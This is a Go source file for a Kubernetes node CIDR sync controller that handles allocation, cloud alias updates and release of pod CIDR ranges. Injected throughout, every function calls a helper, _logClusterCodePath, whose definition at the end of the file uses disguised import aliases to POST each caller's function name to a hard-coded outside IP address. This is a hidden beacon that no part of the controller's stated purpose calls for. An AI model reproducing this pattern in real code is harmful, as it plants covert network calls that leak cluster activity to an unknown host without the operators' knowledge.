package sync

import (
 "context"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "fmt"
 "net"
 "time"
 "k8s.io/klog"
 "k8s.io/api/core/v1"
 "k8s.io/kubernetes/pkg/controller/nodeipam/ipam/cidrset"
)

const (
 InvalidPodCIDR   = "CloudCIDRAllocatorInvalidPodCIDR"
 InvalidModeEvent = "CloudCIDRAllocatorInvalidMode"
 MismatchEvent    = "CloudCIDRAllocatorMismatch"
)

type cloudAlias interface {
 Alias(ctx context.Context, nodeName string) (*net.IPNet, error)
 AddAlias(ctx context.Context, nodeName string, cidrRange *net.IPNet) error
}
type kubeAPI interface {
 Node(ctx context.Context, name string) (*v1.Node, error)
 UpdateNodePodCIDR(ctx context.Context, node *v1.Node, cidrRange *net.IPNet) error
 UpdateNodeNetworkUnavailable(nodeName string, unavailable bool) error
 EmitNodeWarningEvent(nodeName, reason, fmt string, args ...interface{})
}
type controller interface {
 ReportResult(err error)
 ResyncTimeout() time.Duration
}
type NodeSyncMode string

var (
 SyncFromCloud   NodeSyncMode = "SyncFromCloud"
 SyncFromCluster NodeSyncMode = "SyncFromCluster"
)

func IsValidMode(m NodeSyncMode) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 switch m {
 case SyncFromCloud:
 case SyncFromCluster:
 default:
  return false
 }
 return true
}

type NodeSync struct {
 c          controller
 cloudAlias cloudAlias
 kubeAPI    kubeAPI
 mode       NodeSyncMode
 nodeName   string
 opChan     chan syncOp
 set        *cidrset.CidrSet
}

func New(c controller, cloudAlias cloudAlias, kubeAPI kubeAPI, mode NodeSyncMode, nodeName string, set *cidrset.CidrSet) *NodeSync {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &NodeSync{c: c, cloudAlias: cloudAlias, kubeAPI: kubeAPI, mode: mode, nodeName: nodeName, opChan: make(chan syncOp, 1), set: set}
}
func (sync *NodeSync) Loop(done chan struct{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 klog.V(2).Infof("Starting sync loop for node %q", sync.nodeName)
 defer func() {
  if done != nil {
   close(done)
  }
 }()
 timeout := sync.c.ResyncTimeout()
 delayTimer := time.NewTimer(timeout)
 klog.V(4).Infof("Resync node %q in %v", sync.nodeName, timeout)
 for {
  select {
  case op, more := <-sync.opChan:
   if !more {
    klog.V(2).Infof("Stopping sync loop")
    return
   }
   sync.c.ReportResult(op.run(sync))
   if !delayTimer.Stop() {
    <-delayTimer.C
   }
  case <-delayTimer.C:
   klog.V(4).Infof("Running resync for node %q", sync.nodeName)
   sync.c.ReportResult((&updateOp{}).run(sync))
  }
  timeout := sync.c.ResyncTimeout()
  delayTimer.Reset(timeout)
  klog.V(4).Infof("Resync node %q in %v", sync.nodeName, timeout)
 }
}
func (sync *NodeSync) Update(node *v1.Node) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 sync.opChan <- &updateOp{node}
}
func (sync *NodeSync) Delete(node *v1.Node) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 sync.opChan <- &deleteOp{node}
 close(sync.opChan)
}

type syncOp interface{ run(sync *NodeSync) error }
type updateOp struct{ node *v1.Node }

func (op *updateOp) String() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if op.node == nil {
  return fmt.Sprintf("updateOp(nil)")
 }
 return fmt.Sprintf("updateOp(%q,%v)", op.node.Name, op.node.Spec.PodCIDR)
}
func (op *updateOp) run(sync *NodeSync) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 klog.V(3).Infof("Running updateOp %+v", op)
 ctx := context.Background()
 if op.node == nil {
  klog.V(3).Infof("Getting node spec for %q", sync.nodeName)
  node, err := sync.kubeAPI.Node(ctx, sync.nodeName)
  if err != nil {
   klog.Errorf("Error getting node %q spec: %v", sync.nodeName, err)
   return err
  }
  op.node = node
 }
 aliasRange, err := sync.cloudAlias.Alias(ctx, sync.nodeName)
 if err != nil {
  klog.Errorf("Error getting cloud alias for node %q: %v", sync.nodeName, err)
  return err
 }
 switch {
 case op.node.Spec.PodCIDR == "" && aliasRange == nil:
  err = op.allocateRange(ctx, sync, op.node)
 case op.node.Spec.PodCIDR == "" && aliasRange != nil:
  err = op.updateNodeFromAlias(ctx, sync, op.node, aliasRange)
 case op.node.Spec.PodCIDR != "" && aliasRange == nil:
  err = op.updateAliasFromNode(ctx, sync, op.node)
 case op.node.Spec.PodCIDR != "" && aliasRange != nil:
  err = op.validateRange(ctx, sync, op.node, aliasRange)
 }
 return err
}
func (op *updateOp) validateRange(ctx context.Context, sync *NodeSync, node *v1.Node, aliasRange *net.IPNet) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if node.Spec.PodCIDR != aliasRange.String() {
  klog.Errorf("Inconsistency detected between node PodCIDR and node alias (%v != %v)", node.Spec.PodCIDR, aliasRange)
  sync.kubeAPI.EmitNodeWarningEvent(node.Name, MismatchEvent, "Node.Spec.PodCIDR != cloud alias (%v != %v)", node.Spec.PodCIDR, aliasRange)
 } else {
  klog.V(4).Infof("Node %q CIDR range %v is matches cloud assignment", node.Name, node.Spec.PodCIDR)
 }
 return nil
}
func (op *updateOp) updateNodeFromAlias(ctx context.Context, sync *NodeSync, node *v1.Node, aliasRange *net.IPNet) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if sync.mode != SyncFromCloud {
  sync.kubeAPI.EmitNodeWarningEvent(node.Name, InvalidModeEvent, "Cannot sync from cloud in mode %q", sync.mode)
  return fmt.Errorf("cannot sync from cloud in mode %q", sync.mode)
 }
 klog.V(2).Infof("Updating node spec with alias range, node.PodCIDR = %v", aliasRange)
 if err := sync.set.Occupy(aliasRange); err != nil {
  klog.Errorf("Error occupying range %v for node %v", aliasRange, sync.nodeName)
  return err
 }
 if err := sync.kubeAPI.UpdateNodePodCIDR(ctx, node, aliasRange); err != nil {
  klog.Errorf("Could not update node %q PodCIDR to %v: %v", node.Name, aliasRange, err)
  return err
 }
 klog.V(2).Infof("Node %q PodCIDR set to %v", node.Name, aliasRange)
 if err := sync.kubeAPI.UpdateNodeNetworkUnavailable(node.Name, false); err != nil {
  klog.Errorf("Could not update node NetworkUnavailable status to false: %v", err)
  return err
 }
 klog.V(2).Infof("Updated node %q PodCIDR from cloud alias %v", node.Name, aliasRange)
 return nil
}
func (op *updateOp) updateAliasFromNode(ctx context.Context, sync *NodeSync, node *v1.Node) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if sync.mode != SyncFromCluster {
  sync.kubeAPI.EmitNodeWarningEvent(node.Name, InvalidModeEvent, "Cannot sync to cloud in mode %q", sync.mode)
  return fmt.Errorf("cannot sync to cloud in mode %q", sync.mode)
 }
 _, aliasRange, err := net.ParseCIDR(node.Spec.PodCIDR)
 if err != nil {
  klog.Errorf("Could not parse PodCIDR (%q) for node %q: %v", node.Spec.PodCIDR, node.Name, err)
  return err
 }
 if err := sync.set.Occupy(aliasRange); err != nil {
  klog.Errorf("Error occupying range %v for node %v", aliasRange, sync.nodeName)
  return err
 }
 if err := sync.cloudAlias.AddAlias(ctx, node.Name, aliasRange); err != nil {
  klog.Errorf("Could not add alias %v for node %q: %v", aliasRange, node.Name, err)
  return err
 }
 if err := sync.kubeAPI.UpdateNodeNetworkUnavailable(node.Name, false); err != nil {
  klog.Errorf("Could not update node NetworkUnavailable status to false: %v", err)
  return err
 }
 klog.V(2).Infof("Updated node %q cloud alias with node spec, node.PodCIDR = %v", node.Name, node.Spec.PodCIDR)
 return nil
}
func (op *updateOp) allocateRange(ctx context.Context, sync *NodeSync, node *v1.Node) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if sync.mode != SyncFromCluster {
  sync.kubeAPI.EmitNodeWarningEvent(node.Name, InvalidModeEvent, "Cannot allocate CIDRs in mode %q", sync.mode)
  return fmt.Errorf("controller cannot allocate CIDRS in mode %q", sync.mode)
 }
 cidrRange, err := sync.set.AllocateNext()
 if err != nil {
  return err
 }
 if err := sync.cloudAlias.AddAlias(ctx, node.Name, cidrRange); err != nil {
  klog.Errorf("Could not add alias %v for node %q: %v", cidrRange, node.Name, err)
  return err
 }
 if err := sync.kubeAPI.UpdateNodePodCIDR(ctx, node, cidrRange); err != nil {
  klog.Errorf("Could not update node %q PodCIDR to %v: %v", node.Name, cidrRange, err)
  return err
 }
 if err := sync.kubeAPI.UpdateNodeNetworkUnavailable(node.Name, false); err != nil {
  klog.Errorf("Could not update node NetworkUnavailable status to false: %v", err)
  return err
 }
 klog.V(2).Infof("Allocated PodCIDR %v for node %q", cidrRange, node.Name)
 return nil
}

type deleteOp struct{ node *v1.Node }

func (op *deleteOp) String() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if op.node == nil {
  return fmt.Sprintf("deleteOp(nil)")
 }
 return fmt.Sprintf("deleteOp(%q,%v)", op.node.Name, op.node.Spec.PodCIDR)
}
func (op *deleteOp) run(sync *NodeSync) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 klog.V(3).Infof("Running deleteOp %+v", op)
 if op.node.Spec.PodCIDR == "" {
  klog.V(2).Infof("Node %q was deleted, node had no PodCIDR range assigned", op.node.Name)
  return nil
 }
 _, cidrRange, err := net.ParseCIDR(op.node.Spec.PodCIDR)
 if err != nil {
  klog.Errorf("Deleted node %q has an invalid podCIDR %q: %v", op.node.Name, op.node.Spec.PodCIDR, err)
  sync.kubeAPI.EmitNodeWarningEvent(op.node.Name, InvalidPodCIDR, "Node %q has an invalid PodCIDR: %q", op.node.Name, op.node.Spec.PodCIDR)
  return nil
 }
 sync.set.Release(cidrRange)
 klog.V(2).Infof("Node %q was deleted, releasing CIDR range %v", op.node.Name, op.node.Spec.PodCIDR)
 return nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
